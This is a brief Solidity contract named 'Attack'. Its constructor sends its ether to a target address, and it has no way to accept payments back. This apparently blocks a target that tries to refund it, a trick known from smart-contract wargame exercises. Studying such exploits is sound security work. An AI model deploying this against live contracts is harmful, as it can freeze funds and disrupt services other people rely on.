// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    constructor(address payable _target) payable {
        (bool sent,) = _target.call{value: msg.value}("");
        require(sent);
    }
}
